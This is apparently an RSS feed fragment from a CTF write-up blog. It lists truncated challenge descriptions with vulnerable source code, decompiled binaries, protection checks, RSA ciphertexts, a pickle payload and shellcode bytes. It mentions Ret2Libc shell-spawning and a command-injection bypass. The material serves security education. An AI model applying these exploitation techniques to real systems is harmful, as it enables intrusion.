pragma solidity 0.8.23; contract RussianRoulette { constructor() payable { // i need more bullets } function pullTrigger() public returns (string memory) { if (uint256(blockhash(block.number - 1)) % 10 == 7) { selfdestruct(payable(msg.sender)); // 💀 } else { return "im SAFU ... for now"; } } } Moreover, we have this Setup.sol, which is common in Solidity challenges:
pragma solidity 0.8.23; import {RussianRoulette} from "</description></item><item><title>SaaS</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/saas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/saas/</guid><description>We are given a 64-bit binary called chall:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Static code analysis We also have the original C source code (chall.c):
#include &amp;lt;errno.h&amp;gt; #include &amp;lt;error.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;seccomp.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;sys/mman.h&amp;gt; #include &amp;lt;sys/syscall.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #define SIZE 0x100 // http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+rax%2C+rax%0D%0Amov+rdi%2C+rsp%0D%0Aand+rdi%2C+0xfffffffffffff000%0D%0Asub+rdi%2C+0x2000%0D%0Amov+rcx%2C+0x600%0D%0Arep+stosq%0D%0Axor+rbx%2C+rbx%0D%0Axor+rcx%2C+rcx%0D%0Axor+rdx%2C+rdx%0D%0Axor+rsp%2C+rsp%0D%0Axor+rbp%2C+rbp%0D%0Axor+rsi%2C+rsi%0D%0Axor+rdi%2C+rdi%0D%0Axor+r8%2C+r8%0D%0Axor+r9%2C+r9%0D%0Axor+r10%2C+r10%0D%0Axor+r11%2C+r11%0D%0Axor+r12%2C+r12%0D%0Axor+r13%2C+r13%0D%0Axor+r14%2C+r14%0D%0Axor+r15%2C+r15%0D%0A&amp;amp;arch=x86-64&amp;amp;as_format=inline#assembly #define HEADER "\x48\x31\xc0\x48\x89\xe7\x48\x81\xe7\x00\xf0\xff\xff\x48\x81\xef\x00\x20\x00\x00\x48\xc7\xc1\x00\x06\x00\x00\xf3\x48\xab\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xe4\x48\x31\xed\x48\x31\xf6\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff" #define FLAG_SIZE 64 char flag[FLAG_SIZE]; void load_flag() { int fd; if ((fd = open("</description></item><item><title>Sacred Scrolls</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/sacred-scrolls/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/sacred-scrolls/</guid><description>We are given a 64-bit binary called sacred_scrolls:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Reverse engineering If we open the binary in Ghidra, we will see this decompiled C source code for the main function:
void main() { undefined8 *puVar1; long i; byte bVar2; undefined wizard_tag[1528]; undefined8 uStack_110; undefined8 target; undefined8 local_100; undefined8 local_f8; undefined8 local_f0; undefined8 local_e8; undefined8 local_e0; undefined8 local_d8; undefined8 local_d0; undefined8 local_c8; undefined8 local_c0; undefined8 local_b8; undefined8 local_b0; undefined8 local_a8; undefined8 local_a0; undefined8 local_98; undefined8 local_90; undefined8 local_88; undefined8 local_80; undefined8 local_78; undefined8 local_70; undefined8 local_68; undefined8 local_60; undefined8 local_58; undefined8 local_50; undefined8 local_48; undefined *wizard_tag_copy; undefined8 local_38; undefined4 local_2c; bVar2 = 0; uStack_110 = 0x400ecc; setup(); uStack_110 = 0x400ed1; banner(); uStack_110 = 0x400edb; clean(); uStack_110 = 0x400eec; printf("</description></item><item><title>Sacred Scrolls: Revenge</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/sacred-scrolls-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/sacred-scrolls-revenge/</guid><description>We are given a 64-bit binary called sacred_scrolls:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Reverse engineering If we open the binary in Ghidra, we will see this decompiled C source code for the main function:
void main() { undefined8 *puVar1; long i; byte bVar2; undefined wizard_tag[1528]; undefined8 uStack_110; undefined8 target; undefined8 local_100; undefined8 local_f8; undefined8 local_f0; undefined8 local_e8; undefined8 local_e0; undefined8 local_d8; undefined8 local_d0; undefined8 local_c8; undefined8 local_c0; undefined8 local_b8; undefined8 local_b0; undefined8 local_a8; undefined8 local_a0; undefined8 local_98; undefined8 local_90; undefined8 local_88; undefined8 local_80; undefined8 local_78; undefined8 local_70; undefined8 local_68; undefined8 local_60; undefined8 local_58; undefined8 local_50; undefined8 local_48; undefined *wizard_tag_copy; undefined8 local_38; undefined4 local_2c; bVar2 = 0; uStack_110 = 0x400efa; setup(); uStack_110 = 0x400eff; banner(); uStack_110 = 0x400f09; clean(); uStack_110 = 0x400f1a; printf("</description></item><item><title>Sacred Scrolls' Revenge</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/sacred-scrolls-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/sacred-scrolls-revenge/</guid><description>This challenge is a fixed version of Sacred Scrolls. Almost all the program behavior is the same as in the previous version, so read that write-up before this one.
They fixed the challenge due to an unintended solution (command injection):
$ ./sacred_scrolls ▄▞▀▀▀▜▄▖ ▗ ▖ ▗ ▖ ▗ ▖▟▞▖▘▗▖▚▘ ▝▀▄ ▖▝ ▘ ▝ ▝ ▝ ▘ ▝ ▝ ▝ ▘ ▝ ▖▌▀ ▖▖▚▘▝▗▝▝ ▗▝▄▖▘ ▘ ▗▗▞▘▚▝▝▝▗▝ ▘ ▖ ▗▚▖ ▗ ▖ ▗ ▗ ▖▗▄▜▝▚▝▝▖▘▘▝ ▖ ▖ ▘ ▗ ▖▛▞ ▖ ▖▘ ▖ ▗ ▘ ▖ ▗▝ ▗▄▞▚▗▗▘ ▝ ▖ ▖ ▖▘▀▀▖ ▖ ▗▖▛▚▗▝ ▖ ▗ ▝ ▝ ▘ ▖ ▘▗▗▗▝▌ ▗ ▗▄▞▀▚▝ ▖ ▖▝ ▖▝ ▖▗ ▖▘▝▗▗▄▞▘ ▖ ▝ ▗ ▖ ▄▞▀▚▗▝▝ ▖ ▘ ▘ ▗▝ ▖ ▘▗▗▝▖▞▞▌▜▐▐▖ ▗ ▘▄▖▀▀▗▝▝▗ ▝ ▗ ▘ ▖▖▘▖▝▗ ▚▝▖▖▌▌▌▙▞▌▀ ▘ ▄▞▞▀▗▝▞▝▖▝ ▘▝ ▖▘▖▖▘▞▝▖▚▚▐▐▟▟▞▘▘ ▖▝ ▄▖▛▀▖▞▖▌▘▘▝▖ ▖▝ ▗ ▝ ▖▗ ▘▖▖▖▞▐▗▚▚▙▙▛▀▝ ▄▄▜▚▙▄▄▀▝▗ ▄▝▝▘ ▘ ▘ ▘ ▗ ▖▗ ▝▖▄▐▐▐▟▟▜▜▝ ▘ ▐▟▛█▜▚▚▚▞▄▖▘ ▖ ▗ ▗ ▘▝ ▖▗▗▐▝▄▟▞▙█▐▝ ▐▚▛▞▜▚▟ ▝▚▚ ▘▝ ▝ ▝▗ ▖▘ ▗▝▝▖▞▖▌▙▜▙▙▀▘ ▗ ▝ ▗ ▘ ▜▐▚▐▐▜▟█▖ ▀▙▖▗ ▖▗▝ ▖▗ ▖▘▖▞▞▟▞▛▛▟▀ ▗ ▘ ▖ ▝▛▗ ▖▌▙▙█▘ ▗▚ ▖▗ ▗▗▗▗▚▐▐▐▞▛▟▞▛▝ ▗▝ █ ▖▗▀▝▝▛█▗ ▜▘▖▗▝▗▗▚▚▚▙▜▞▙▜▝ ▝ ▘ ▗ ▖ ▐▖▖ ▚ ▚▜▜▖▞▐▚▗▗▐▗▜▞▛▙▚▙▀ ▝ ▗ ▘ ▗ ▚▝▖▚▚▖▀▛▞▐▟▚▘▌▌▛▙▜▟▝▘ ▗ ▗ ▗ ▝▌▝▖▌▜▚▛▟█▛▙▜▞▛▛▞▘ ▖ ▝ ▖ ▗▝ ▘ ▝▙▗▐▐▐▜▜▙█▞▟▞▛▝ ▗ ▖ ▗ ▗ ▝ ▝▘▌▖▖▙▀▙▜▚▜▝ ▗ ▘ ▝▀▗▀▞▞▘▘ ▝ ▘ ▗▝ ▗ ▝ ▝ ▝ ▗▝ ▘ ▝ ▝ ▖▝ ▘ ▝ [+] All ⅀ ℙ ∉ ⎳ ⎳ ⅀ have been whiped out.</description></item><item><title>Safe Opener</title><link>https://7rocky.github.io/en/ctf/picoctf/reverse-engineering/safe-opener/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/reverse-engineering/safe-opener/</guid><description>We are given a Java source file called SafeOpener.java:
import java.io.*; import java.util.*; public class SafeOpener { public static void main(String args[]) throws IOException { BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in)); Base64.Encoder encoder = Base64.getEncoder(); String encodedkey = ""; String key = ""; int i = 0; boolean isOpen; while (i &amp;lt; 3) { System.out.print("Enter password for the safe: "); key = keyboard.readLine(); encodedkey = encoder.encodeToString(key.getBytes()); System.out.println(encodedkey); isOpen = openSafe(encodedkey); if (!</description></item><item><title>same</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/same/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/same/</guid><description>We are given the source code in Python to encrypt the flag:
from Crypto.Util.number import getPrime, bytes_to_long m = bytes_to_long(open("flag", "rb").read()) n = getPrime(512)*getPrime(512) e = [1337,31337] print(n) print(pow(m,e[0],n)) print(pow(m,e[1],n)) And we have the output of the program:
88627598925887227793409704066287679810103408445903546693879278352563489802835708613718629728355698762251810901364530308365201192197988674078034209878433048946797619290221501750862580914894979204943093716650072734138749420932619469204815802746273252727013183568196402223549961607284086898768583604510696483111 45254947860172381004009381991735702721210786277711531577381599020185600496787746985669891424940792336396574951744089759764874889285927022268694128526139687661305707984329995359802337446670063047702309778972385903473896687843125261988493615328641864610786785749566148338268077425756876069789788618208807001704 16054811947596452078263236160429328686151351092304509270058479526590947874445940946506791900760052230887962479603369427120610506778471930164144528718052332194666418267005043709704814833963217926271924910466448499814399455203725279998913865531351070938872586642424346857094632491904168889134624707595846754719 The cryptosystem is RSA, but there&amp;rsquo;s a vulnerability. The flag ($m$) is being encrypted two times as
$$ c_1 = m ^ {e_1} \mod{n} $$ $$ c_2 = m ^ {e_2} \mod{n} $$ The problem here is that the same message is raised to a different power but using the same modulus $n$.</description></item><item><title>sanitize</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/sanitize/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/sanitize/</guid><description>We are provided with this webpage:
If we look into the HTML source code, we see /debug:
And there we can find the source code of the web application:
from flask import Flask, request, render_template, Response, url_for, g from sqlite3 import dbapi2 as sqlite3 from functools import wraps app = Flask(__name__) def get_db(): db = getattr(g, '_database', None) if db is None: db = g._database = sqlite3.connect(':memory:', isolation_level=None) db.row_factory = sqlite3.</description></item><item><title>Saturn</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/saturn/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/saturn/</guid><description>We are given the following website:
Moreover, we have the source code of the server, which is in Flask (Python).
Source code analysis This is app.py:
from flask import Flask, request, render_template import requests from safeurl import safeurl app = Flask(__name__) @app.route('/', methods=['GET', 'POST']) def index(): if request.method == 'POST': url = request.form['url'] try: su = safeurl.SafeURL() opt = safeurl.Options() opt.enableFollowLocation().setFollowLocationLimit(0) su.setOptions(opt) su.execute(url) except: return render_template('index.html', error=f"Malicious input detected.") r = requests.</description></item><item><title>Scrambled Pizzeria</title><link>https://7rocky.github.io/en/ctf/other/teamitaly-ctf/scrambled-pizzeria/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/teamitaly-ctf/scrambled-pizzeria/</guid><description>We are given the source code of the server in Python:
#!/usr/bin/python3 import numpy as np import numpy.typing as npt from PIL import Image import os def permutation( img: npt.NDArray[np.uint8], c: npt.NDArray[np.uint64] ) -&amp;gt; npt.NDArray[np.uint8]: height, width = img.shape cm = c[np.arange(max(height, width)) % len(c)] rows = np.argsort(cm[:height]) cols = np.argsort(cm[:width]) return img[rows, :][:, cols] def substitution( con: npt.NDArray[np.uint8], c: npt.NDArray[np.uint64] ) -&amp;gt; npt.NDArray[np.uint8]: ids = np.arange(np.prod(con.shape)) % len(c) return con ^ (c % 256).</description></item><item><title>scrambler</title><link>https://7rocky.github.io/en/ctf/other/securinets-ctf/scrambler/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/securinets-ctf/scrambler/</guid><description>We are given a 64-bit binary called scrambler:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) We also have the remote Glibc binary (libc.so_1.6), so we can use pwninit to patch the binary and use the provided library, so that the local and the remote exploits are equal:
$ pwninit --libc libc.so_1.6 --bin scrambler --no-template bin: scrambler libc: libc.so.6 fetching linker https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.31-0ubuntu9.7_amd64.deb unstripping libc https://launchpad.</description></item><item><title>Scripts and Formulas</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/scripts-and-formulas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/scripts-and-formulas/</guid><description>We are given the following files:
$ file * Invoice_01.lnk: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has command line arguments, Icon number=0, Archive, ctime=Tue May 30 18:44:18 2023, mtime=Tue Jul 4 11:46:42 2023, atime=Tue May 30 18:44:18 2023, length=492032, window=hidenormalshowminimized invoice.vbs: ASCII text, with very long lines (2360), with CRLF line terminators logs.zip: Zip archive data, at least v2.0 to extract, compression method=store The logs.</description></item><item><title>Search</title><link>https://7rocky.github.io/en/search/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/search/</guid><description>SearchSearch for any keyword inside CTF or HTB solutions &amp;lt;- MAIN Total: 0</description></item><item><title>Secret Note</title><link>https://7rocky.github.io/en/ctf/other/blackhat-ctf/secret-note/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/blackhat-ctf/secret-note/</guid><description>We are given a 64-bit binary called main:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled If we open the binary in Ghidra we see these functions:
void get_name() { long in_FS_OFFSET; char name[40]; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); puts("Please fill in your name:"); read(0, name, 30); printf("Thank you "); printf(name); if (canary != *(long *) (in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } } int main() { long in_FS_OFFSET; char secret[56]; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); setvbuf(stderr, NULL, 2, 0); setvbuf(stdout, NULL, 2, 0); get_name(); puts("</description></item><item><title>Secure</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/secure/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/secure/</guid><description>We are given this website (https://puzzler7.imaginaryctf.org:7002/):
Since the name of the challenge is &amp;ldquo;Secure&amp;rdquo; and the browser showed a warning telling that the certificate is self-signed, we must examine the certificate.
Flag For instance, we can use curl with verbose(-v) and insecure (-k) modes. And there&amp;rsquo;s the flag, in the certificate&amp;rsquo;s subject and issuer:
$ curl -vk https://puzzler7.imaginaryctf.org:7002/ * Trying 137.184.207.224:7002... * Connected to puzzler7.imaginaryctf.org (137.184.207.224) port 7002 (#0) * ALPN: offers h2 * ALPN: offers http/1.</description></item><item><title>Secure Digital</title><link>https://7rocky.github.io/en/ctf/htb-challenges/hardware/secure-digital/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/hardware/secure-digital/</guid><description>We are told that someone has read the master key of a microSD card, and we are given the signal traces in a trace_captured.sal file.
Signal analysis We can use Saleae Logic 2 to analyze the traces, and we have this:
SPI If we research a bit, we will find out that microSD cards use Serial Peripheral Interface (SPI) as a communication protocol. Comparing the signals we have to the ones we see in SPI Analyzer - User Guide, we can guess that Channel 0 and Channel 1 are MISO or MOSI, Channel 2 is Enable and Channel 3 is Clock, so we can add the analyzer:</description></item><item><title>Secured Transfer</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/secured-transfer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/secured-transfer/</guid><description>We are given a binary file called securetransfer:
$ file securetransfer securetransfer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0457997eda987eb100de85a2954fc8b8fc660a53, for GNU/Linux 3.2.0, stripped We also have a network capture file called trace.pcap.
Traffic analysis Starting with trace.pcap, we can use Wireshark to analyze the network capture file:
There is only one TCP segment that has data:
17275a3d9163b2798392813bf5e6826657bd11426076c910a38b68c2bcbbd3a5 Reverse engineering We can use Ghidra to read the decompiled source code in C.</description></item><item><title>Secured Transfer</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/secured-transfer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/secured-transfer/</guid><description>We are given a binary file called securetransfer:
$ file securetransfer securetransfer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0457997eda987eb100de85a2954fc8b8fc660a53, for GNU/Linux 3.2.0, stripped We also have a network capture file called trace.pcap.
Traffic analysis Starting with trace.pcap, we can use Wireshark to analyze the network capture file:
There is only one TCP segment that has data:
5f558867993dccc99879f7ca39c5e406972f84a3a9dd5d48972421ff375cb18c Reverse engineering We can use Ghidra to read the decompiled source code in C.</description></item><item><title>seed-sPRiNG</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/seed-spring/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/seed-spring/</guid><description>We are given a 32-bit binary called seed_spring:
Arch: i386-32-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Reverse engineering This time we do not have the source code. However, we can use a reversing tool like Ghidra to decompile the binary into somewhat readable C source code. Here we have the main function:
void main() { uint local_20; uint local_1c; uint local_18; int local_14; undefined *local_10; local_10 = &amp;amp;stack0x00000004; puts("</description></item><item><title>Sekure Decrypt</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/sekure-decrypt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/sekure-decrypt/</guid><description>We are given a binary called dec, the C source code (src.c) and a core file (core):
$ file dec dec: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=daf03fccbc32333244dc0f36e874e27457110af1, for GNU/Linux 3.2.0, with debug_info, not stripped $ file core core: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from './dec', real uid: 0, effective uid: 0, real gid: 0, effective gid: 0, execfn: '.</description></item><item><title>Serpentine</title><link>https://7rocky.github.io/en/ctf/picoctf/general-skills/serpentine/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/general-skills/serpentine/</guid><description>We are provided with a Python script that should print a flag, but it is not doing it:
import random import sys def str_xor(secret, key): # extend key to secret length new_key = key i = 0 while len(new_key) &amp;lt; len(secret): new_key = new_key + key[i] i = (i + 1) % len(key) return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c, new_key_c) in zip(secret, new_key)]) flag_enc = chr(0x15) + chr(0x07) + chr(0x08) + chr(0x06) + chr(0x27) + chr(0x21) + chr(0x23) + chr(0x15) + chr(0x5c) + chr(0x01) + chr(0x57) + chr(0x2a) + chr(0x17) + chr(0x5e) + chr(0x5f) + chr(0x0d) + chr(0x3b) + chr(0x19) + chr(0x56) + chr(0x5b) + \ chr(0x5e) + chr(0x36) + chr(0x53) + chr(0x07) + chr(0x51) + chr(0x18) + chr(0x58) + chr(0x05) + chr(0x57) + chr(0x11) + \ chr(0x3a) + chr(0x0c) + chr(0x5d) + chr(0x5c) + chr(0x52) + \ chr(0x42) + chr(0x50) + chr(0x5a) + chr(0x5d) + chr(0x14) def print_flag(): flag = str_xor(flag_enc, 'enkidu') print(flag) def print_encouragement(): encouragements = ['You can do it!</description></item><item><title>Share</title><link>https://7rocky.github.io/en/ctf/other/hitcon-ctf/share/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hitcon-ctf/share/</guid><description>We are given the Python source code of the server:
#!/usr/bin/env python3 from Crypto.Util.number import isPrime, getRandomRange, bytes_to_long from typing import List import os, signal class SecretSharing: def __init__(self, p: int, n: int, secret: int): self.p = p self.n = n self.poly = [secret] + [getRandomRange(0, self.p - 1) for _ in range(n - 1)] def evaluate(self, x: int) -&amp;gt; int: return ( sum([self.poly[i] * pow(x, i, self.p) for i in range(len(self.</description></item><item><title>Shattered Tablet</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/shattered-tablet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/shattered-tablet/</guid><description>We have a binary called tablet:
$ file tablet tablet: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=71ad3ff9f7e5fbf0edc75446337a0a68deb7ecd6, for GNU/Linux 3.2.0, not stripped Decompilation If we open it in Ghidra, we will see this main function:
/* WARNING: Could not reconcile some variable overlaps */ undefined8 main(void) { undefined8 local_48; undefined8 local_40; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; undefined8 local_18; undefined8 local_10; local_48 = 0; local_40 = 0; local_38 = 0; local_30 = 0; local_28 = 0; local_20 = 0; local_18 = 0; local_10 = 0; printf("</description></item><item><title>Shell time!</title><link>https://7rocky.github.io/en/ctf/ctflearn/binary/shell-time/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/binary/shell-time/</guid><description>This challenge is the continuation of RIP my bof. Check it our first if you have not done it yet.
Now, the flag is stored at /flag2.txt, so we must do something more than redirect the program execution to system(&amp;quot;cat /flag.txt&amp;quot;), as in RIP my bof.
The first thing I came up with was Ret2Libc. The idea is to obtain a shell by calling system inside Glibc with &amp;quot;/bin/sh&amp;quot; as argument.</description></item><item><title>Shifted</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/shifted/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/shifted/</guid><description>We are given this Python source code:
import string import random flag = open("flag.txt").read().strip() mystery_num = random.randint(100,1000) new_alphabet = list(string.ascii_lowercase + string.digits + string.punctuation) enc_flag = "" def shift(char): index = new_alphabet.index(char) new_index = (index + mystery_num) % len(new_alphabet) return new_alphabet[new_index] for char in flag: enc_flag += shift(char) mystery_num += 10 print(enc_flag) # 15[=&amp;gt;ts-!]kgjhz%6cn~";=;.1b3:&amp;gt;}sq7n'\^]42t What the script does is set an alphabet and a random number (mystery_num). Then, to encrypt the flag, it finds the index of the current plaintext character in the alphabet, adds it to the random number (modulo the length of the alphabet) and returns the character at that new index.</description></item><item><title>Shooting star</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/shooting-star/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/shooting-star/</guid><description>We are given a 64-bit binary called shooting_star:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Reverse engineering We can use Ghidra to analyze the binary and look at the decompiled source code in C:
void main() { setup(); write(1, &amp;amp;message, 0x5b); star(); return; } This function calls star:
void star() { char option[2]; undefined input_data[64]; read(0, option, 2); if (option[0] == '1') { write(1,"</description></item><item><title>show-me-what-you-got</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/show-me-what-you-got/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/show-me-what-you-got/</guid><description>We are given a 64-bit binary called vuln:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) If we use Ghidra to extract the decompiled C source code, we see the main function:
undefined8 main() { long in_FS_OFFSET; char local_118[264]; long local_10; local_10 = *(long *) (in_FS_OFFSET + 0x28); setvbuf(stdout, (char *) 0x0, 2, 0); setvbuf(stdin, (char *) 0x0, 2, 0); puts("Send your string to be printed:"</description></item><item><title>Sickle</title><link>https://7rocky.github.io/en/ctf/other/seccon-ctf/sickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/seccon-ctf/sickle/</guid><description>We are provided with the Python source code that checks if the flag is right:
import pickle, io payload = b'\x8c\x08builtins\x8c\x07getattr\x93\x942\x8c\x08builtins\x8c\x05input\x93\x8c\x06FLAG&amp;gt; \x85R\x8c\x06encode\x86R)R\x940g0\n\x8c\x08builtins\x8c\x04dict\x93\x8c\x03get\x86R\x8c\x08builtins\x8c\x07globals\x93)R\x8c\x01f\x86R\x8c\x04seek\x86R\x94g0\n\x8c\x08builtins\x8c\x03int\x93\x8c\x07__add__\x86R\x940g0\n\x8c\x08builtins\x8c\x03int\x93\x8c\x07__mul__\x86R\x940g0\n\x8c\x08builtins\x8c\x03int\x93\x8c\x06__eq__\x86R\x940g3\ng5\n\x8c\x08builtins\x8c\x03len\x93g1\n\x85RM@\x00\x86RM\x05\x01\x86R\x85R.0g0\ng1\n\x8c\x0b__getitem__\x86R\x940M\x00\x00\x940g2\ng3\ng0\ng6\ng7\n\x85R\x8c\x06__le__\x86RM\x7f\x00\x85RMJ\x01\x86R\x85R.0g2\ng3\ng4\ng5\ng3\ng7\nM\x01\x00\x86Rp7\nM@\x00\x86RMU\x00\x86RM"\x01\x86R\x85R0g0\ng0\n]\x94\x8c\x06append\x86R\x940g8\n\x8c\x0b__getitem__\x86R\x940g0\n\x8c\x08builtins\x8c\x03int\x93\x8c\nfrom_bytes\x86R\x940M\x00\x00p7\n0g9\ng11\ng6\n\x8c\x08builtins\x8c\x05slice\x93g4\ng7\nM\x08\x00\x86Rg4\ng3\ng7\nM\x01\x00\x86RM\x08\x00\x86R\x86R\x85R\x8c\x06little\x86R\x85R0g2\ng3\ng4\ng5\ng3\ng7\nM\x01\x00\x86Rp7\nM\x08\x00\x86RMw\x00\x86RM\xc9\x01\x86R\x85R0g0\n]\x94\x8c\x06append\x86R\x940g0\ng12\n\x8c\x0b__getitem__\x86R\x940g0\n\x8c\x08builtins\x8c\x03int\x93\x8c\x07__xor__\x86R\x940I1244422970072434993\n\x940M\x00\x00p7\n0g13\n\x8c\x08builtins\x8c\x03pow\x93g15\ng10\ng7\n\x85Rg16\n\x86RI65537\nI18446744073709551557\n\x87R\x85R0g14\ng7\n\x85Rp16\n0g2\ng3\ng4\ng5\ng3\ng7\nM\x01\x00\x86Rp7\nM\x08\x00\x86RM\x83\x00\x86RM\xa7\x02\x86R\x85R0g0\ng12\n\x8c\x06__eq__\x86R(I8215359690687096682\nI1862662588367509514\nI8350772864914849965\nI11616510986494699232\nI3711648467207374797\nI9722127090168848805\nI16780197523811627561\nI18138828537077112905\nl\x85R.' f = io.BytesIO(payload) res = pickle.load(f) if isinstance(res, bool) and res: print("Congratulations!!") else: print("Nope") What it does is load a serialized payload into pickle and check if the result is true:
$ python3 problem.py FLAG&amp;gt; SECCON{asdf} Nope Therefore, we must analyze the pickle payload to determine how the flag is being checked.</description></item><item><title>Sigma Technology</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/sigma-technology/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/sigma-technology/</guid><description>We are given a webpage where we can modify the color of five pixels from a dog image. We can choose the position of the pixels (x, y) and the color (RGB values) and the image has 32x32 pixels:
The robot classifies the image as some of these objects:
